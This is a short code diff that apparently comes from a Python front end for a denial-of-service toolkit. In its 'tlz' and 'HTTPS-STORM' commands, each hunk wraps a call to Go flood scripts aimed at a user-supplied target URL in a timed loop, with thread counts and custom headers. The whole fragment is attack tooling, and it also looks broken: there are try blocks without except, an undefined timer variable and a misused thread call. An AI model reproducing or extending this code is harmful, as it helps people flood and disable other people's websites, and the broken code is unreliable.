@@ -1458,6 +1458,8 @@ def command():
         
     elif command == "tlz" or command == "TLZ":
         target, thread, t = get_info_l72()
+        timelol = time.time() + int(timer)
+        while time.time() < timelol:
             try :
                 os.system(f'cd godzilla && go run TLZ.go -url {target} GET')
         threading.Thread(target, args=(target, t, thread)).start()
@@ -1467,6 +1469,8 @@ def command():
         
     elif command == "HTTPS-STORM" or command == "https-storm" :
         target, methode, thread, t = get_info_l72()
+        timelol = time.time() + int(timer)
+        while time.time() < timelol:
             try:
                 os.system(f'cd godzilla && go run HTTPS-STORM.go {target} {thread} {methode} {t} header.txt')
                 
